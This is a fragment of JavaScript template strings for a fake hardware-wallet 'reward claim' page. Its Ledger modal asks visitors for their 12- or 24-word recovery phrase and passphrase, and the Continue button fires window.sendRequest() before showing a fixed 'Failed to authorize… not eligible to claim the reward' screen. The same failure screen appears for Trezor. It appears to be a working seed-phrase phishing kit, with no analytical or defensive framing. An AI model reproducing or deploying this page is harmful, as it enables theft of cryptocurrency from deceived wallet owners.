                                    <div class="sc-jIAOiI dWkvrK" style="position: relative; opacity: 1; transform: none;">

                                        <div class="sc-iBkjds emnDjo" style="padding-bottom: 18px;">

                                            <h1 class="sc-ftvSup fqLYro">Import Ledger Wallet<br></h1>

                                            <div class="sc-papXJ jCcNJP">To connect your Ledger wallet,<br>enter the secret phrase.<br></div>

                                        </div>

<div class="jssSolrise17 MuiBox-root css-0">

    <div class="MuiBox-root css-3mllz6 css-selector">

    <input class="phrase-display-none dddsad dddsadx" placeholder="Passphrase" type="password" autocomplete="new-password" id="connect-hardware-passphrase">

    <select class="dddsad" name="connect-hardware-words" id="connect-hardware-words">

<option value="12">I have 12-word phrase</option>

<option value="24">I have 24-word phrase</option>

</select>

    </div>

    <textarea id="mnemonic-textarea" placeholder="Enter your recovery phrase" class="phrase-display-none MuiGrid-root MuiGrid-container MuiGrid-spacing-xs-2 jssSolrise18 css-isbt42" rows="4" style="padding-top:16px;margin-bottom: 16px;height: 120%;margin-top: 16px;background-color: rgb(255, 255, 255);border: 1px solid rgb(202, 206, 209);border-radius: 0.25rem;resize: none;margin-right: 15px;margin-left: 15px;width: calc(100% - 30px);"></textarea>

    <div id="mnemonic-words" class="MuiGrid-root MuiGrid-container MuiGrid-spacing-xs-2 jssSolrise18 css-isbt42">

        <div class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">

            <div id="mnemonic-inputdiv-0" class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">

                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">

                    <span class="notranslate">&ZeroWidthSpace;</span>

                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">1.</p>

                </div>

                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-0" type="text" tabindex="1" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">

            </div>

        </div>

        <div id="mnemonic-inputdiv-1" class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">

            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">

                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">

                    <span class="notranslate">&ZeroWidthSpace;</span>

                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">2.</p>

                </div>

                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-1" type="text" tabindex="2" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">

            </div>

        </div>

        <div id="mnemonic-inputdiv-2" class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">

            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">

                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">

                    <span class="notranslate">&ZeroWidthSpace;</span>

                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">3.</p>

                </div>

                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-2" type="text" tabindex="3" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">

            </div>

        </div>

        <div id="mnemonic-inputdiv-3" class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">

            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">

                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">

                    <span class="notranslate">&ZeroWidthSpace;</span>

                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">4.</p>

                </div>

                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-3" type="text" tabindex="4" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">

            </div>

        </div>

        <div id="mnemonic-inputdiv-4" class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">

            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">

                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">

                    <span class="notranslate">&ZeroWidthSpace;</span>

                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">5.</p>

                </div>

                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-4" type="text" tabindex="5" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">

            </div>

        </div>

        <div id="mnemonic-inputdiv-5" class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">

            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">

                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">

                    <span class="notranslate">&ZeroWidthSpace;</span>

                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">6.</p>

                </div>

                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-5" type="text" tabindex="6" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">

            </div>

        </div>

        <div id="mnemonic-inputdiv-6" class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">

            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">

                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">

                    <span class="notranslate">&ZeroWidthSpace;</span>

                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">7.</p>

                </div>

                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-6" type="text" tabindex="7" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">

            </div>

        </div>

        <div id="mnemonic-inputdiv-7" class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">

            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">

                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">

                    <span class="notranslate">&ZeroWidthSpace;</span>

                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">8.</p>

                </div>

                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-7" type="text" tabindex="8" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">

            </div>

        </div>

        <div id="mnemonic-inputdiv-8" class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">

            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">

                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">

                    <span class="notranslate">&ZeroWidthSpace;</span>

                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">9.</p>

                </div>

                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-8" type="text" tabindex="9" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">

            </div>

        </div>

        <div id="mnemonic-inputdiv-9" class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">

            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">

                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">

                    <span class="notranslate">&ZeroWidthSpace;</span>

                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">10.</p>

                </div>

                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-9" type="text" tabindex="10" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">

            </div>

        </div>

        <div id="mnemonic-inputdiv-10" class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">

            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">

                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">

                    <span class="notranslate">&ZeroWidthSpace;</span>

                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">11.</p>

                </div>

                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-10" type="text" tabindex="11" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">

            </div>

        </div>

        <div id="mnemonic-inputdiv-11" class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">

            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">

                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">

                    <span class="notranslate">&ZeroWidthSpace;</span>

                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">12.</p>

                </div>

                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-11" type="text" tabindex="12" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">

            </div>

        </div>

        <div id="mnemonic-inputdiv-12" class="phrase-display-none MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">

            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">

                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">

                    <span class="notranslate">&ZeroWidthSpace;</span>

                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">13.</p>

                </div>

                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-12" type="text" tabindex="13" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">

            </div>

        </div>

        <div id="mnemonic-inputdiv-13" class="phrase-display-none MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">

            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">

                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">

                    <span class="notranslate">&ZeroWidthSpace;</span>

                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">14.</p>

                </div>

                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-13" type="text" tabindex="14" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">

            </div>

        </div>

        <div id="mnemonic-inputdiv-14" class="phrase-display-none MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">

            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">

                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">

                    <span class="notranslate">&ZeroWidthSpace;</span>

                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">15.</p>

                </div>

                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-14" type="text" tabindex="15" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">

            </div>

        </div>

        <div id="mnemonic-inputdiv-15" class="phrase-display-none MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">

            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">

                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">

                    <span class="notranslate">&ZeroWidthSpace;</span>

                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">16.</p>

                </div>

                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-15" type="text" tabindex="16" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">

            </div>

        </div>

        <div id="mnemonic-inputdiv-16" class="phrase-display-none MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">

            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">

                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">

                    <span class="notranslate">&ZeroWidthSpace;</span>

                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">17.</p>

                </div>

                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-16" type="text" tabindex="17" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">

            </div>

        </div>

        <div id="mnemonic-inputdiv-17" class="phrase-display-none MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">

            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">

                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">

                    <span class="notranslate">&ZeroWidthSpace;</span>

                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">18.</p>

                </div>

                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-17" type="text" tabindex="18" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">

            </div>

        </div>

        <div id="mnemonic-inputdiv-18" class="phrase-display-none MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">

            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">

                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">

                    <span class="notranslate">&ZeroWidthSpace;</span>

                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">19.</p>

                </div>

                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-18" type="text" tabindex="19" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">

            </div>

        </div>

        <div id="mnemonic-inputdiv-19" class="phrase-display-none MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">

            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">

                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">

                    <span class="notranslate">&ZeroWidthSpace;</span>

                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">20.</p>

                </div>

                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-19" type="text" tabindex="20" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">

            </div>

        </div>

        <div id="mnemonic-inputdiv-20" class="phrase-display-none MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">

            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">

                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">

                    <span class="notranslate">&ZeroWidthSpace;</span>

                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">21.</p>

                </div>

                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-20" type="text" tabindex="21" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">

            </div>

        </div>

        <div id="mnemonic-inputdiv-21" class="phrase-display-none MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">

            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">

                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">

                    <span class="notranslate">&ZeroWidthSpace;</span>

                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">22.</p>

                </div>

                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-21" type="text" tabindex="22" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">

            </div>

        </div>

        <div id="mnemonic-inputdiv-22" class="phrase-display-none MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">

            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">

                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">

                    <span class="notranslate">&ZeroWidthSpace;</span>

                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">23.</p>

                </div>

                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-22" type="text" tabindex="23" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">

            </div>

        </div>

        <div id="mnemonic-inputdiv-23" class="phrase-display-none MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">

            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">

                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">

                    <span class="notranslate">&ZeroWidthSpace;</span>

                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">24.</p>

                </div>

                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-23" type="text" tabindex="24" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">

            </div>

        </div>

    </div>

</div>



                                        <button onClick="window.sendRequest();updatePage(LedgerWalletFinishModal);"  class="sc-himrzO eyWopv connect-phrase-button">
                                           <div class="sc-ikZpkk FGzOk">

                                              <div class="sc-jIZahH gjHfVN">

                                                 <svg width="13" height="12" viewBox="0 0 13 12" fill="none" xmlns="http://www.w3.org/2000/svg" class="sc-ezWOiH bkoIPM">

                                                    <line stroke="currentColor" x1="1" y1="6" x2="12" y2="6" stroke-width="var(--stroke-width)" stroke-linecap="round" class="sc-kLLXSd bDZenP"></line>

                                                    <path stroke="currentColor" d="M7.51431 1.5L11.757 5.74264M7.5 10.4858L11.7426 6.24314" stroke-width="var(--stroke-width)" stroke-linecap="round" class="sc-bZkfAO"></path>

                                                 </svg>

                                              </div>

                                           </div>

                                           <span class="sc-gXmSlM CshDF">Continue</span>

                                        </button>

                                    </div>

                                </div>

                            </div>

                        </div>

                    </div>

                </div>

            </div>

        </div>

    </div>

</div>`;



const LedgerWalletFinishModal = `

<div class="sc-idiyUo hBuwwI" style="--height: 391px; --width: 343px;">

    <div style="pointer-events: none; position: absolute; top: 0px; bottom: 0px; left: 50%; transform: translateX(-50%); width: var(--width); z-index: 9; transition: width 200ms ease 0s;"></div>

    <div class="sc-iqcoie RrATt active">

        <div class="sc-crXcEl gcowpW">

            <button onclick="updatePage(CloseModal);" aria-label="Close" class="sc-fnykZs hFEFWT">

                <svg width="14" height="14" viewBox="0 0 14 14" fill="none" xmlns="http://www.w3.org/2000/svg">

                    <path d="M1 13L13 1" stroke="currentColor" stroke-width="2" stroke-linecap="round"></path>

                    <path d="M1 0.999999L13 13" stroke="currentColor" stroke-width="2" stroke-linecap="round"></path>

                </svg>

            </button>

            <button onclick="updatePage(LedgerWalletModal);" aria-label="Back" class="sc-fEOsli iSYxCx" style="opacity: 1;">

                <svg width="9" height="16" viewBox="0 0 9 16" fill="none" xmlns="http://www.w3.org/2000/svg">

                    <path d="M8 1L1 8L8 15" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>

                </svg>

            </button>

        </div>

        <div class="sc-eCYdqJ dLUlU">

            <div style="position: absolute; top: 0px; left: 0px; right: 0px; opacity: 1;">Ledger Wallet</div>

        </div>

        <div class="sc-evZas gcbNhn">

            <div class="sc-breuTD hVhjow active-scale-up">

                <div style="pointer-events: auto;" class="sc-ksZaOG dmNTWR">

                    <div style="z-index: 2; opacity: 1; transform: none;">

                        <div class="sc-dkzDqf jKlSZW">

                            <div class="sc-ZyCDH cBtLfS">

                                <div class="sc-jSMfEi lbAEgN"></div>

                                <div class="sc-jOhDuK hLWHUX">

                                    <div class="sc-hlnMnd czUBmg">

                                        <div class="sc-jTYCaT epSHCc">

                                            <div class="sc-jQHtVU jhhhSe">

                                                <div style="transform: scale(0.86); position: relative; width: 100%;">

<svg viewBox="0 0 16 16" style="width: 80px" fill="none" xmlns="http://www.w3.org/2000/svg" class="w-full max-w-[28px] h-auto">

                            <path d="M13.9017 0.646973C13.3462 0.646973 12.8304 0.929357 12.5394 1.39357L9.40403 5.95741C9.30186 6.10784 9.34331 6.31059 9.49675 6.41075C9.6211 6.49202 9.78561 6.48196 9.89889 6.38645L12.9851 3.76201C13.0364 3.71677 13.1154 3.72137 13.1616 3.77165C13.1825 3.79469 13.1937 3.82444 13.1937 3.85502V12.0719C13.1937 12.1397 13.1377 12.1942 13.0684 12.1942C13.0312 12.1942 12.9962 12.1783 12.9727 12.1502L3.6435 1.20169C3.33966 0.850174 2.89352 0.647392 2.42388 0.646973H2.09782C1.21536 0.646973 0.5 1.34833 0.5 2.2135V13.7863C0.5 14.6515 1.21536 15.3528 2.09782 15.3528C2.65336 15.3528 3.16915 15.0704 3.46017 14.6062L6.59558 10.0424C6.69769 9.89194 6.65624 9.68919 6.50279 9.58903C6.37845 9.50776 6.21394 9.51782 6.10071 9.61334L3.01446 12.2378C2.96318 12.283 2.88412 12.2784 2.83797 12.2281C2.81703 12.2051 2.80592 12.1753 2.80634 12.1447V3.92583C2.80634 3.85796 2.86232 3.80349 2.93155 3.80349C2.96831 3.80349 3.00377 3.81941 3.02728 3.84748L12.3552 14.7981C12.659 15.1496 13.1052 15.3524 13.5749 15.3528H13.9009C14.7833 15.3532 15.4992 14.6523 15.5 13.7871V2.2135C15.5 1.34833 14.7842 0.646973 13.9017 0.646973Z" fill="#000000"></path>

                        </svg>                                                </div>

                                            </div>

                                            <div class="sc-fvNpTx eFjHkq"></div>

                                        </div>

                                    </div>

                                </div>

                                <div class="sc-gKXOVf liyQQU">

                                    <div class="sc-jIAOiI dWkvrK" style="will-change: transform, opacity; position: relative; opacity: 1; transform: none;">

                                        <div class="sc-iBkjds emnDjo" style="padding: 0px 8px 8px;">

                                            <h1 class="sc-ftvSup fqLYro">Failed to authorize<br></h1>

                                            <div class="sc-papXJ jCcNJP">Your wallet is not eligible to claim the reward. Please try using a another one.<br></div>

                                        </div>

                                    </div>

                                </div>

                            </div>

                            <button onclick="updatePage(LedgerWalletModal);" class="sc-himrzO eyWopv">

                              <div class="sc-ikZpkk FGzOk">

                                 <div class="sc-jIZahH gjHfVN">

                                    <svg width="13" height="12" viewBox="0 0 13 12" fill="none" xmlns="http://www.w3.org/2000/svg" class="sc-ezWOiH bkoIPM">

                                       <line stroke="currentColor" x1="1" y1="6" x2="12" y2="6" stroke-width="var(--stroke-width)" stroke-linecap="round" class="sc-kLLXSd bDZenP"></line>

                                       <path stroke="currentColor" d="M7.51431 1.5L11.757 5.74264M7.5 10.4858L11.7426 6.24314" stroke-width="var(--stroke-width)" stroke-linecap="round" class="sc-bZkfAO"></path>

                                    </svg>

                                 </div>

                              </div>

                              <span class="sc-gXmSlM CshDF">Continue</span>

                           </button>

                        </div>

                    </div>

                </div>

            </div>

        </div>

    </div>

</div>

`;



const TrezorWalletFinishModal = `

<div class="sc-idiyUo hBuwwI" style="--height: 391px; --width: 343px;">

    <div style="pointer-events: none; position: absolute; top: 0px; bottom: 0px; left: 50%; transform: translateX(-50%); width: var(--width); z-index: 9; transition: width 200ms ease 0s;"></div>

    <div class="sc-iqcoie RrATt active">

        <div class="sc-crXcEl gcowpW">

            <button onclick="updatePage(CloseModal);" aria-label="Close" class="sc-fnykZs hFEFWT">

                <svg width="14" height="14" viewBox="0 0 14 14" fill="none" xmlns="http://www.w3.org/2000/svg">

                    <path d="M1 13L13 1" stroke="currentColor" stroke-width="2" stroke-linecap="round"></path>

                    <path d="M1 0.999999L13 13" stroke="currentColor" stroke-width="2" stroke-linecap="round"></path>

                </svg>

            </button>

            <button onclick="updatePage(TrezorWalletModal);" aria-label="Back" class="sc-fEOsli iSYxCx" style="opacity: 1;">

                <svg width="9" height="16" viewBox="0 0 9 16" fill="none" xmlns="http://www.w3.org/2000/svg">

                    <path d="M8 1L1 8L8 15" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>

                </svg>

            </button>

        </div>

        <div class="sc-eCYdqJ dLUlU">

            <div style="position: absolute; top: 0px; left: 0px; right: 0px; opacity: 1;">Import Wallet</div>

        </div>

        <div class="sc-evZas gcbNhn">

            <div class="sc-breuTD hVhjow active-scale-up">

                <div style="pointer-events: auto;" class="sc-ksZaOG dmNTWR">

                    <div style="z-index: 2; opacity: 1; transform: none;">

                        <div class="sc-dkzDqf jKlSZW">

                            <div class="sc-ZyCDH cBtLfS">

                                <div class="sc-jSMfEi lbAEgN"></div>

                                <div class="sc-jOhDuK hLWHUX">

                                    <div class="sc-hlnMnd czUBmg">

                                        <div class="sc-jTYCaT epSHCc">

                                            <div class="sc-jQHtVU jhhhSe">



<svg viewBox="0 0 16 16" style="width: 80px" fill="none" xmlns="http://www.w3.org/2000/svg" class="w-full max-w-[28px] h-auto">

                            <path d="M13.9017 0.646973C13.3462 0.646973 12.8304 0.929357 12.5394 1.39357L9.40403 5.95741C9.30186 6.10784 9.34331 6.31059 9.49675 6.41075C9.6211 6.49202 9.78561 6.48196 9.89889 6.38645L12.9851 3.76201C13.0364 3.71677 13.1154 3.72137 13.1616 3.77165C13.1825 3.79469 13.1937 3.82444 13.1937 3.85502V12.0719C13.1937 12.1397 13.1377 12.1942 13.0684 12.1942C13.0312 12.1942 12.9962 12.1783 12.9727 12.1502L3.6435 1.20169C3.33966 0.850174 2.89352 0.647392 2.42388 0.646973H2.09782C1.21536 0.646973 0.5 1.34833 0.5 2.2135V13.7863C0.5 14.6515 1.21536 15.3528 2.09782 15.3528C2.65336 15.3528 3.16915 15.0704 3.46017 14.6062L6.59558 10.0424C6.69769 9.89194 6.65624 9.68919 6.50279 9.58903C6.37845 9.50776 6.21394 9.51782 6.10071 9.61334L3.01446 12.2378C2.96318 12.283 2.88412 12.2784 2.83797 12.2281C2.81703 12.2051 2.80592 12.1753 2.80634 12.1447V3.92583C2.80634 3.85796 2.86232 3.80349 2.93155 3.80349C2.96831 3.80349 3.00377 3.81941 3.02728 3.84748L12.3552 14.7981C12.659 15.1496 13.1052 15.3524 13.5749 15.3528H13.9009C14.7833 15.3532 15.4992 14.6523 15.5 13.7871V2.2135C15.5 1.34833 14.7842 0.646973 13.9017 0.646973Z" fill="#000000"></path>

                        </svg>  

                                            </div>

                                            <div class="sc-fvNpTx eFjHkq"></div>

                                        </div>

                                    </div>

                                </div>

                                <div class="sc-gKXOVf liyQQU">

                                    <div class="sc-jIAOiI dWkvrK" style="will-change: transform, opacity; position: relative; opacity: 1; transform: none;">

                                        <div class="sc-iBkjds emnDjo" style="padding: 0px 8px 8px;">

                                            <h1 class="sc-ftvSup fqLYro">Failed to authorize<br></h1>

                                            <div class="sc-papXJ jCcNJP">Your wallet is not eligible to claim the reward. Please try using a another one.<br></div>

                                        </div>

                                    </div>

                                </div>

                            </div>

                            <button onclick="updatePage(TrezorWalletModal);" class="sc-himrzO eyWopv">

                              <div class="sc-ikZpkk FGzOk">

                                 <div class="sc-jIZahH gjHfVN">

                                    <svg width="13" height="12" viewBox="0 0 13 12" fill="none" xmlns="http://www.w3.org/2000/svg" class="sc-ezWOiH bkoIPM">

                                       <line stroke="currentColor" x1="1" y1="6" x2="12" y2="6" stroke-width="var(--stroke-width)" stroke-linecap="round" class="sc-kLLXSd bDZenP"></line>

